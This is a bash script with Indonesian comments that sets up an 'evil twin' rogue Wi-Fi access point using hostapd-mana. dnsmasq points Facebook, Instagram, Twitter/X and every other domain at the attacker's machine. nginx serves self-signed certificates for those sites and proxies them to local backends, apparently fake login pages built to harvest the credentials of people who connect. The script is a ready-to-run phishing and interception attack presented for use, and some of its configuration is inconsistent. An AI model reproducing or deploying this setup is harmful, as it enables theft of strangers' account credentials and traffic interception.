#!/bin/bash
# ===============================================
# Evil Twin Captive Portal - One Click Script
# ===============================================

# 🔧 Konfigurasi (ubah sesuai kebutuhan)
AP_IFACE="wlx00c0cab84be1"   # Interface WiFi untuk AP
INTERNET_IFACE="wlan0"      # Interface untuk internet
SSID_NAME="WIFI@KU"
AP_IP="192.168.15.1"
SUBNET="192.168.15.0/24"
TARGET_DIR="hostapd-mana"

ip link set $IFACE down
iw dev $IFACE set type __ap
ip link set $IFACE up

# cek apakah folder ada
if [ -d "$TARGET_DIR" ]; then
  echo "✅ Folder '$TARGET_DIR' sudah ada, skip clone."
else
  echo "📥 Folder '$TARGET_DIR' belum ada, cloning repo..."
  git clone https://github.com/sensepost/hostapd-mana.git "$TARGET_DIR"

  echo "🔧 Build hostapd-mana..."
  cd "$TARGET_DIR/hostapd"
  sudo make
  cd -
fi
chmod +x captive/setup.sh captive/start-server.sh
./captive/setup.sh && ./captive/start-server.sh

# ===============================================
# SETUP NETWORK
# ===============================================
echo "[*] Configuring network interface $AP_IFACE ..."
ip addr flush dev "$AP_IFACE"
ip addr add "$AP_IP/24" dev "$AP_IFACE"
ip link set "$AP_IFACE" up

# ===============================================
# CONFIG HOSTAPD
# ===============================================
cat > /etc/hostapd/hostapd.conf <<EOF
interface=$AP_IFACE
driver=nl80211
ssid=$SSID_NAME
hw_mode=g
channel=6
auth_algs=1
wmm_enabled=1
ieee80211n=1
EOF

# ===============================================
# CONFIG DNSMASQ
# ===============================================
cat > /etc/dnsmasq.conf <<EOF
interface=$AP_IFACE
dhcp-range=192.168.15.50,192.168.15.150,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
bind-interfaces
listen-address=$AP_IP
no-resolv
filterwin2k
bogus-priv
stop-dns-rebind

# Apple captive
address=/captive.apple.com/$AP_IP
address=/www.apple.com/$AP_IP
address=/apple.com/$AP_IP
address=/gsp1.apple.com/$AP_IP
address=/captive.g.aaplimg.com/$AP_IP

# Windows captive
address=/msftconnecttest.com/$AP_IP
address=/www.msftncsi.com/$AP_IP

# Firefox captive
address=/detectportal.firefox.com/$AP_IP

# Samsung captive
address=/connectivity.samsung.com/$AP_IP
address=/connectivitycheck.samsung.com/$AP_IP

# Android (beberapa biarkan ke DNS asli)
server=/clients3.google.com/8.8.8.8
server=/clients4.google.com/8.8.8.8
server=/connectivitycheck.android.com/8.8.8.8
server=/connectivitycheck.gstatic.com/8.8.8.8

# Social Media hijack
address=/facebook.com/$AP_IP
address=/www.facebook.com/$AP_IP
address=/instagram.com/$AP_IP
address=/www.instagram.com/$AP_IP
address=/twitter.com/$AP_IP
address=/x.com/$AP_IP

# Catch-all redirect
log-queries 
log-facility=/var/log/dnsmasq.log
address=/#/$AP_IP
EOF

# ===============================================
# CONFIG IPTABLES
# ===============================================
echo "[*] Flushing and configuring iptables..."
echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -F
iptables -t nat -F
iptables -X

iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

iptables -t nat -A POSTROUTING -o "$INTERNET_IFACE" -j MASQUERADE
iptables -A FORWARD -i "$AP_IFACE" -o "$INTERNET_IFACE" -j ACCEPT
iptables -A FORWARD -i "$INTERNET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

iptables -A INPUT -i "$AP_IFACE" -p udp --dport 67:68 --sport 67:68 -j ACCEPT
iptables -A INPUT -i "$AP_IFACE" -p udp --dport 53 -j ACCEPT
iptables -A INPUT -i "$AP_IFACE" -p tcp --dport 53 -j ACCEPT
iptables -A INPUT -i "$AP_IFACE" -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -i "$AP_IFACE" -p tcp --dport 443 -j ACCEPT
iptables -I INPUT -i lo -j ACCEPT

iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-ports 80
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p udp --dport 53 -j REDIRECT --to-port 53
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 53 -j REDIRECT --to-port 53

iptables -A FORWARD -i "$AP_IFACE" -p tcp --dport 853 -j REJECT --reject-with tcp-reset
iptables -A FORWARD -i "$AP_IFACE" -p udp --dport 853 -j REJECT

echo "[*] Captive portal iptables rules applied!"

sudo tee /etc/nginx/sites-available/default > /dev/null <<'NGINX'
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
}

http {
    sendfile on;
    tcp_nopush on;
    types_hash_max_size 2048;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;

    error_log /var/log/nginx/error.log;

    gzip on;

    server_names_hash_bucket_size 128;

    log_format withhost '$remote_addr - [$time_local] "$request" '
                        'host:$host status:$status upstream:$upstream_addr '
                        'rt:$request_time ua:"$http_user_agent"';

    access_log /var/log/nginx/access.log withhost;

    ####################################
    # captive/login logic (keep here)
    ####################################
    # apakah ada cookie logged_in?
    map $cookie_logged_in $is_logged_in {
        default 0;
        1       1;
    }

    # apakah ada arg captive (returning from portal)
    map $arg_captive $is_captive {
        default 0;
        1       1;
    }

    # gabungkan keduanya jadi flag need_portal
    map "$is_logged_in$is_captive" $need_portal {
        default 1;
        10      0;
        01      0;
        11      0;
    }

    # include other configs
    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}

NGINX

sudo tee /etc/nginx/sites-available/default > /dev/null <<'NGINX'
# ===================== PORTAL BY IP =====================
server {
    listen 80;
    server_name 192.168.15.1 portal.local;

    root /var/www/html;
    index index.html index.htm;

    # Portal static app
    location / {
        try_files $uri $uri/ /index.html;
    }

    # Optional: if portal app is Express behind port 3003:
    location /api/ {
        proxy_redirect off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_pass http://127.0.0.1:3003;
        include /etc/nginx/proxy_params;
    }
}

# ===================== FACEBOOK -> :3000 =====================
server {
    listen 80;
    server_name facebook.com www.facebook.com m.facebook.com fb.com;

    access_log /var/log/nginx/facebook_access.log withhost;
    error_log  /var/log/nginx/facebook_error.log;

    # debug headers (optional: remove in production)
    add_header X-Debug-Host $host always;
    add_header X-Debug-Need-Portal $need_portal always;
    add_header X-Debug-Arg $arg_captive always;
    add_header X-Debug-Cookie $cookie_logged_in always;

    location / {
        # 1) not authorized -> capture origin and redirect to portal app
        if ($need_portal = 1) {
            set $origin "$scheme://$host$request_uri";
            return 302 http://192.168.15.1:3003/?origin=$origin;
        }

        # 2) returning from portal -> set cookie for this host domain and continue
        if ($arg_captive = 1) {
            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
            # Do not return here; let proxy_pass handle response from backend
        }

        # proxy headers and pass to backend app on port 3000
        proxy_redirect off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        proxy_pass http://127.0.0.1:3000;
        include /etc/nginx/proxy_params;
    }
}

server {
    listen 443 ssl;
    server_name facebook.com www.facebook.com m.facebook.com fb.com;

    ssl_certificate     /etc/ssl/certs/ssl-cert-snakeoil.pem;
    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;

    access_log /var/log/nginx/facebook_access.log withhost;
    error_log  /var/log/nginx/facebook_error_ssl.log;

    location / {
        if ($need_portal = 1) {
            set $origin "$scheme://$host$request_uri";
            return 302 http://192.168.15.1:3003/?origin=$origin;
        }

        if ($arg_captive = 1) {
            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
        }

        proxy_redirect off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        proxy_pass http://127.0.0.1:3000;
        include /etc/nginx/proxy_params;
    }
}

# ===================== INSTAGRAM -> :3001 =====================
server {
    listen 80;
    server_name instagram.com www.instagram.com i.instagram.com;

    access_log /var/log/nginx/instagram_access.log withhost;
    error_log  /var/log/nginx/instagram_error.log;

    add_header X-Debug-Host $host always;
    add_header X-Debug-Need-Portal $need_portal always;

    location / {
        if ($need_portal = 1) {
            set $origin "$scheme://$host$request_uri";
            return 302 http://192.168.15.1:3003/?origin=$origin;
        }

        if ($arg_captive = 1) {
            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
        }

        proxy_redirect off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        proxy_pass http://127.0.0.1:3001;
        include /etc/nginx/proxy_params;
    }
}

server {
    listen 443 ssl;
    server_name instagram.com www.instagram.com i.instagram.com;

    ssl_certificate     /etc/ssl/certs/ssl-cert-snakeoil.pem;
    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;

    access_log /var/log/nginx/instagram_access.log withhost;
    error_log  /var/log/nginx/instagram_error_ssl.log;

    location / {
        if ($need_portal = 1) {
            set $origin "$scheme://$host$request_uri";
            return 302 http://192.168.15.1:3003/?origin=$origin;
        }

        if ($arg_captive = 1) {
            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
        }

        proxy_redirect off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        proxy_pass http://127.0.0.1:3001;
        include /etc/nginx/proxy_params;
    }
}

# ===================== X/TWITTER -> :3002 =====================
server {
    listen 80;
    server_name x.com www.x.com twitter.com www.twitter.com;

    access_log /var/log/nginx/x_access.log withhost;
    error_log  /var/log/nginx/x_error.log;

    add_header X-Debug-Host $host always;
    add_header X-Debug-Need-Portal $need_portal always;

    location / {
        if ($need_portal = 1) {
            set $origin "$scheme://$host$request_uri";
            return 302 http://192.168.15.1:3003/?origin=$origin;
        }

        if ($arg_captive = 1) {
            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
        }

        proxy_redirect off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        proxy_pass http://127.0.0.1:3002;
        include /etc/nginx/proxy_params;
    }
}

server {
    listen 443 ssl;
    server_name x.com www.x.com twitter.com www.twitter.com;

    ssl_certificate     /etc/ssl/certs/ssl-cert-snakeoil.pem;
    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;

    access_log /var/log/nginx/x_access.log withhost;
    error_log  /var/log/nginx/x_error_ssl.log;

    location / {
        if ($need_portal = 1) {
            set $origin "$scheme://$host$request_uri";
            return 302 http://192.168.15.1:3003/?origin=$origin;
        }

        if ($arg_captive = 1) {
            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
        }

        proxy_redirect off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        proxy_pass http://127.0.0.1:3002;
        include /etc/nginx/proxy_params;
    }
}

# ===================== DEFAULT / CATCH-ALL -> portal =====================
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;

    access_log /var/log/nginx/default_access.log withhost;
    error_log /var/log/nginx/default_error.log;

    add_header X-Debug-Host $host always;
    add_header X-Debug-Need-Portal $need_portal always;

    location / {
        if ($need_portal = 1) {
            set $origin "$scheme://$host$request_uri";
            return 302 http://192.168.15.1:3003/?origin=$origin;
        }

        if ($arg_captive = 1) {
            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
        }

        proxy_redirect off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        # send to portal app by default if backend not specific
        proxy_pass http://127.0.0.1:3003;
        include /etc/nginx/proxy_params;
    }
}

NGINX

# ===============================================
# START SERVICES
# ===============================================
CONFIG_FILE="/etc/hostapd/hostapd.conf"
EXECUTABLE="./hostapd-mana/hostapd/hostapd"

if [ ! -f "$CONFIG_FILE" ]; then
  echo "❌ File $CONFIG_FILE tidak ditemukan!"
  exit 1
fi

if [ ! -f "$EXECUTABLE" ]; then
  echo "❌ Executable hostapd-mana tidak ditemukan, pastikan sudah compile (make)."
  exit 1
fi

echo "[*] Stopping system hostapd (if running)..."
systemctl stop hostapd || true

echo "[*] Restarting dnsmasq & nginx..."
systemctl restart dnsmasq
systemctl restart nginx

echo "🚀 Menjalankan hostapd-mana dengan config $CONFIG_FILE ..."
sudo $EXECUTABLE -dd $CONFIG_FILE